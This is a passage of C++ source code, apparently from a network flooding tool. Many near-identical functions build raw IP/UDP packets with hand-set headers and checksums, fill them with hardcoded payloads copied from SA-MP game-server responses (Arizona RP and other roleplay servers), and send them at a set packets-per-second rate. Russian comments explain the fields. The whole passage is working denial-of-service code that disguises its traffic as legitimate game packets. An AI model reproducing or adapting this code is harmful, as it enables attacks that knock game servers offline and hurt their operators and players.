	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x5a\x4f\x38\x6f\xca\x46\x80\x10\xc8\xb9\x02\x64\x02\x00\x00\x00\x00\x08\x00\x18\xc0\x05\x61\x16\x8f\xfe\x0f\x90\x34\x5e\x73\x7c\xac\x47\x2f\xab\x74\x17\xfe\x83\x93\xf9\x97\xf2\xa0\x1c\x06\xec\x50\x5c\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz24(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 107; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x14\x59\x38\x57\xcd\x46\x80\x10\xc8\xe8\x00\x4f\x01\x00\x00\x00\x00\x08\x00\x73\xf0\x0e\x00\x1f\xaf\xff\x17\xa0\xa4\x5f\xb2\xde\x8c\x43\x74\xc5\x74\x17\xa0\x42\x93\xf8\x27\xd0\x80\x06\x18\x1d\xa0\x4f\x00\x00\x00\x29\xb2\x70\xb0\x1a\x8e\x00\x20\xcf\xb3\x02\xc0\x7f\xe0\x3f\xc0\x00\x1d\x98\x02\x11\x5a\x54\xf4\x31\x03\x0d\x9a\xd0\x44\x00\x00\x00\x00\xd3\xf6\x40\x7c\x02\x58\x6f\x78\xf6\xd5\x6a\x34\x17\xfd\xfd\xcf\x04\x08\x80\x1f", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz25(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 200; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x27\xd9\x38\x60\xcd\x46\x80\x10\xc8\xaf\x00\x66\x05\x00\x00\x00\x00\x00\x00\x4a\xd1\x25\x62\x17\x8c\xb6\x28\x90\xe4\x5f\xb3\xfc\xec\x46\x32\x6d\xb4\x23\xfb\xdc\xb3\xec\x21\x4b\x5b\x5b\x4a\xc3\x81\x5f\x00\x00\x00\x50\xb2\x70\xc2\x1a\x82\x00\x20\xcb\xaf\x00\x12\x69\xe1\xe2\xbe\x43\x7c\x62\x3f\x06\x25\x14\x3e\x0c\x23\x0f\x45\xed\xb7\xd0\xc4\xea\x44\xd7\x42\x00\x00\x00\x00\x3e\x37\x51\xb2\x70\xc2\x9a\x8c\x00\x20\xcf\xa4\x02\xc0\x7f\x80\x00\x11\x41\x42\x11\x71\xeb\xb4\x31\x0e\x16\x1b\xd0\x44\x00\x00\x00\x02\x17\x86\x2c\x60\x01\x74\x56\xd4\xf4\xa0\x6c\xa8\xc7\xfd\xfd\xc8\x04\x08\x80\x18\x52\xb2\x70\xc3\x1a\x8d\x00\x20\xc8\xe8\x00\x4f\x01\x00\x00\x00\x00\x08\x00\x42\x60\x14\x20\x0f\x9f\xf8\xc7\x90\xa4\x58\xa2\xde\xac\x46\x1d\xc5\x74\x12\x14\x02\xe3\xf2\x78\x30\xa0\x0b\x97\xfd\xa0\x4f\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz26(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 93; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\xc1\x54\x40\xbf\x05\xd3\x69\x01\x07\x00\x64\x00\x2d\x00\x00\x00\x56\x49\x42\x45\x53\x20\x7c\x20\x41\x43\x43\x45\x53\x20\x44\x4f\x41\x52\x20\x50\x45\x20\x50\x41\x43\x4b\x20\x28\x62\x69\x74\x2e\x6c\x79\x2f\x70\x61\x63\x6b\x76\x69\x62\x65\x73\x29\x0d\x00\x00\x00\x56\x49\x42\x45\x53\x20\x4f\x4c\x44\x20\x30\x2e\x32\x07\x00\x00\x00\x52\x4f\x20\x2f\x20\x45\x4e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz27(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 84; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x33\x5b\x5b\x44\x32\x6b\x69\x00\x08\x00\x32\x00\x24\x00\x00\x00\x44\x45\x4c\x55\x58\x45\x20\x43\x52\x4d\x50\x20\x7c\x20\xd1\xc5\xd0\xc2\xc5\xd0\x3a\x20\x30\x31\x20\x7c\x20\x5b\x58\x33\x20\xc4\xc5\xcd\xdc\x5d\x0d\x00\x00\x00\x44\x4c\x2d\x43\x52\x4d\x50\x20\x36\x2e\x35\x2e\x34\x07\x00\x00\x00\x52\x75\x73\x73\x69\x61\x6e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz28(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 96; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x05\x27\x6c\x31\xa8\x38\x69\x00\x06\x00\x34\x00\x32\x00\x00\x00\x7b\x46\x46\x45\x37\x33\x38\x7d\x46\x45\x53\x54\x20\x42\x4f\x4e\x55\x53\x7b\x46\x46\x46\x46\x46\x46\x7d\x20\x7c\x20\x7b\x35\x45\x35\x45\x35\x45\x7d\x66\x65\x73\x74\x2d\x72\x70\x2e\x72\x75\x20\x7b\x46\x0b\x00\x00\x00\x56\x65\x72\x73\x69\x6f\x6e\x20\x36\x2e\x35\x07\x00\x00\x00\x52\x75\x73\x73\x69\x61\x6e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz29(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 59; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\xc2\x93\x20\x3e\xca\xd0\x69\x00\x01\x00\xcf\x00\x10\x00\x00\x00\x52\x61\x64\x6d\x69\x72\x20\x52\x6f\x6c\x65\x20\x50\x6c\x61\x79\x0f\x00\x00\x00\x52\x61\x64\x6d\x69\x72\x20\x52\x50\x20\x31\x2e\x37\x2e\x37\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz30(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 83; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x33\x5b\x5b\x5f\xbd\xab\x69\x00\x06\x00\xe8\x03\x1f\x00\x00\x00\x4d\x79\x20\x52\x75\x73\x73\x69\x61\x20\x52\x6f\x6c\x65\x50\x6c\x61\x79\x20\x7c\x20\x53\x65\x72\x76\x65\x72\x3a\x20\x30\x30\x11\x00\x00\x00\x4d\x79\x52\x75\x73\x73\x69\x61\x20\x52\x6f\x6c\x65\x50\x6c\x61\x79\x07\x00\x00\x00\x52\x75\x73\x73\x69\x61\x6e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz31(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 92; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\xd5\x20\x78\x75\x9c\x34\x69\x00\x01\x00\x64\x00\x27\x00\x00\x00\x41\x52\x5a\x20\x57\x4f\x52\x4c\x44\x20\x7c\x20\x31\x2e\x30\x30\x30\x2e\x30\x30\x30\x20\x41\x5a\x20\x2b\x20\x46\x52\x45\x45\x20\x41\x44\x4d\x2f\x4c\x49\x44\x12\x00\x00\x00\x41\x72\x69\x7a\x6f\x6e\x61\x2d\x52\x70\x20\x52\x75\x73\x73\x69\x61\x6e\x07\x00\x00\x00\x52\x75\x73\x73\x69\x61\x6e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz32(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 105; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x95\x38\xfc\xad\xb0\x06\x69\x00\x98\x01\x58\x02\x27\x00\x00\x00\x48\x6f\x72\x69\x7a\x6f\x6e\x74\x65\x20\x52\x6f\x6c\x65\x70\x6c\x61\x79\x20\x23\x31\x20\x7c\x20\x64\x69\x73\x63\x6f\x72\x64\x2e\x67\x67\x2f\x68\x7a\x72\x70\x14\x00\x00\x00\x42\x72\x61\x73\x69\x6c\x20\x2d\x20\x48\x5a\x52\x50\x20\x76\x31\x2e\x33\x2e\x39\x12\x00\x00\x00\x50\x6f\x72\x74\x75\x67\x75\xea\x73\x20\x2d\x20\x42\x72\x61\x73\x69\x6c", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz33(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 99; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x2d\x88\xcc\x1e\x34\x5f\x69\x00\x5c\x00\xe8\x03\x2f\x00\x00\x00\x95\x20\x41\x53\x50\x49\x52\x45\x2d\x52\x50\x20\x95\x20\xc2\xe2\xee\xe4\xe8\x20\x2f\x63\x6f\x64\x65\x20\x42\x4f\x4e\x55\x53\x20\xe8\x20\xef\xee\xeb\xf3\xf7\xe8\x20\xc3\xe5\xeb\xe8\xea\x21\x11\x00\x00\x00\x41\x73\x70\x69\x72\x65\x2d\x72\x70\x20\x52\x75\x73\x73\x69\x61\x6e\x07\x00\x00\x00\x52\x75\x73\x73\x69\x61\x6e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz34(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 119; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x36\x27\xe2\x59\x9b\x00\x69\x00\x16\x00\x2c\x01\x2f\x00\x00\x00\x5b\x44\x5a\x5d\x20\x44\x65\x61\x74\x68\x5a\x6f\x6e\x65\x20\x52\x6f\x6c\x65\x70\x6c\x61\x79\x20\x7c\x20\x5b\xa1\x50\x43\x2f\x41\x6e\x64\x72\x6f\x69\x64\x2f\x45\x58\x50\x20\x78\x32\x21\x5d\x1b\x00\x00\x00\x44\x5a\x3a\x52\x50\x20\x76\x31\x2e\x32\x20\x2d\x20\x52\x6f\x6c\x20\x65\x6e\x20\x65\x73\x70\x61\xf1\x6f\x6c\x11\x00\x00\x00\x45\x73\x70\x61\xf1\x6f\x6c\x20\x2d\x20\x53\x70\x61\x6e\x69\x73\x68", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz35(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 115; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\xbc\xd4\x66\x7a\xb2\x8f\x69\x01\x03\x00\x64\x00\x32\x00\x00\x00\x77\x68\x69\x74\x65\x2d\x66\x75\x7a\x65\x20\x2d\x20\x6d\x65\x6e\x74\x65\x6e\x61\x6e\x74\x61\x28\x72\x65\x7a\x6f\x6c\x76\x61\x72\x65\x20\x73\x65\x72\x76\x65\x72\x20\x73\x70\x61\x72\x74\x2b\x75\x70\x64\x1e\x00\x00\x00\x57\x68\x69\x74\x65\x2d\x46\x75\x7a\x65\x2c\x20\x32\x30\x20\x4a\x61\x6e\x75\x61\x72\x79\x20\x28\x31\x33\x3a\x33\x34\x3a\x07\x00\x00\x00\x52\x4f\x20\x2f\x20\x45\x4e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz36(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 103; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x95\x38\x29\x35\xde\xaa\x69\x00\x01\x00\xc8\x00\x2e\x00\x00\x00\x52\x79\x7a\x65\x6e\x20\x43\x69\x74\x79\x20\x52\x6f\x6c\x65\x70\x6c\x61\x79\x20\x40\x20\x23\x53\x65\x61\x73\x6f\x6e\x4f\x6e\x65\x5b\x4c\x69\x6b\x65\x20\x76\x65\x72\x73\x69\x6f\x6e\x5d\x14\x00\x00\x00\x52\x79\x7a\x65\x6e\x52\x50\x20\x7c\x20\x53\x65\x61\x73\x6f\x6e\x20\x6f\x6e\x65\x09\x00\x00\x00\x50\x6f\x72\x74\x75\x67\x75\x65\x73", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz37(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 167; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x2e\xae\x36\x57\x03\x77\x63\x09\x00\x09\x54\x6f\x6d\x6d\x79\x5f\x4e\x69\x6b\x14\x00\x00\x00\x0d\x53\x61\x73\x68\x61\x5f\x44\x65\x77\x65\x72\x72\x6f\x15\x00\x00\x00\x09\x49\x63\x65\x5f\x50\x72\x69\x63\x65\xa6\xa5\x65\x71\x0c\x44\x61\x6e\x6e\x69\x6b\x5f\x6b\x6f\x6c\x6c\x61\x14\x00\x00\x00\x0d\x4a\x65\x72\x65\x6d\x69\x5f\x48\x6f\x6c\x6b\x69\x6e\xe8\x07\x00\x00\x0c\x5a\x61\x68\x61\x72\x5f\x44\x72\x61\x67\x6f\x6e\x14\x00\x00\x00\x0c\x74\x69\x6d\x61\x2e\x74\x61\x72\x61\x73\x6f\x76\x14\x00\x00\x00\x0e\x4c\x65\x76\x5f\x57\x69\x6e\x63\x68\x65\x73\x74\x65\x72\x14\x00\x00\x00\x0f\x61\x6c\x65\x6b\x73\x65\x79\x5f\x66\x69\x74\x61\x6c\x6f\x76\xe7\x07\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz38(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 110; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x56\x39\xca\x31\xff\x37\x69\x00\x0c\x00\x32\x00\x32\x00\x00\x00\x44\x65\x6c\x69\x72\x69\x75\x6d\x20\x30\x2e\x33\x2e\x37\x20\x28\xd3\xea\xf0\x2f\xd0\xf3\xf1\x2f\xc1\xe5\xeb\x29\x20\x5a\x6f\x6d\x62\x69\x65\x20\x53\x74\x61\x6c\x6b\x65\x72\x20\x44\x61\x79\x5a\x20\x52\x1e\x00\x00\x00\x44\x65\x6c\x69\x72\x69\x75\x6d\x20\x28\x52\x50\x47\x20\x53\x54\x41\x4c\x4b\x45\x52\x20\x44\x61\x79\x5a\x29\x20\x55\x41\x02\x00\x00\x00\x52\x55", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz39(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 104; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x95\x38\xc3\xb0\xa8\x92\x69\x00\x07\x00\x64\x00\x28\x00\x00\x00\x43\x72\x69\x6d\x69\x6e\x61\x6c\x20\x4c\x69\x66\x65\x20\x52\x50\x47\x20\x23\x20\x50\x61\x79\x64\x61\x79\x20\x32\x78\x20\x65\x20\x52\x6f\x75\x62\x6f\x20\x32\x78\x14\x00\x00\x00\x52\x50\x47\x3a\x20\x42\x52\x41\x53\x49\x4c\x20\x30\x2e\x33\x2e\x30\x2d\x52\x32\x10\x00\x00\x00\x50\x6f\x72\x74\x75\x67\x75\xea\x73\x20\x42\x72\x61\x73\x69\x6c", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz40(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 100; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x51\x52\xd9\xc6\x3b\x0b\x69\x00\x00\x00\xc2\x01\x14\x00\x00\x00\x5b\x53\x74\x75\x6e\x74\x2b\x44\x72\x69\x76\x65\x2b\x46\x6c\x79\x2b\x44\x4d\x5d\x1b\x00\x00\x00\x53\x74\x75\x6e\x74\x2c\x44\x72\x69\x76\x65\x2c\x46\x6c\x79\x2c\x44\x4d\x2c\x46\x72\x65\x65\x72\x6f\x61\x6d\x19\x00\x00\x00\x45\x6e\x67\x6c\x69\x73\x68\x20\x2d\x20\x46\x6c\x65\x6d\x69\x73\x68\x20\x2d\x20\x44\x75\x74\x63\x68", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz41(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 73; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x33\x5b\x5b\x64\x1b\xe8\x69\x01\x1c\x00\x64\x00\x1c\x00\x00\x00\xc3\xd3\xd7\xc8\x20\x43\x52\x4d\x50\x20\x7c\x20\xd1\xe5\xf0\xe2\xe5\xf0\x3a\x20\x23\x30\x31\x20\x5b\x58\x32\x5d\x11\x00\x00\x00\xcc\xcf\x20\xcd\xc0\x20\xc4\xce\xcd\xc0\xd2\x20\xd2\xc0\xd7\xca\xc8\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz42(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 116; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\xc2\x93\x20\x32\xb8\x92\x69\x00\x01\x00\x32\x00\x2e\x00\x00\x00\xa0\x20\xa0\x20\xa0\x95\x20\x20\x50\xd3\x43\x43\x4b\xc8\xc9\x20\xc4\x50\xc8\xd4\x54\x20\x43\x45\x50\x42\x45\x50\x20\x20\x95\x20\x20\x52\x44\x53\x20\x20\x95\x20\x20\x44\x4d\x20\x20\x95\x19\x00\x00\x00\x20\x95\x20\x44\x72\x69\x66\x74\x20\x95\x20\x44\x6d\x20\x95\x20\x52\x61\x63\x65\x20\x95\x0a\x44\x4d\x11\x00\x00\x00\x52\x75\x73\x73\x69\x61\x6e\x20\x7c\x20\x45\x6e\x67\x6c\x69\x73\x68", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz43(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 82; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x50\x42\x52\x93\x61\x1e\x69\x01\xc4\x01\xbc\x02\x1d\x00\x00\x00\x41\x72\x69\x7a\x6f\x6e\x61\x20\x52\x6f\x6c\x65\x20\x50\x6c\x61\x79\x20\x7c\x20\x56\x69\x63\x65\x20\x43\x69\x74\x79\x12\x00\x00\x00\x41\x72\x69\x7a\x6f\x6e\x61\x2d\x72\x70\x20\x52\x75\x73\x73\x69\x61\x6e\x07\x00\x00\x00\x52\x75\x73\x73\x69\x61\x6e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
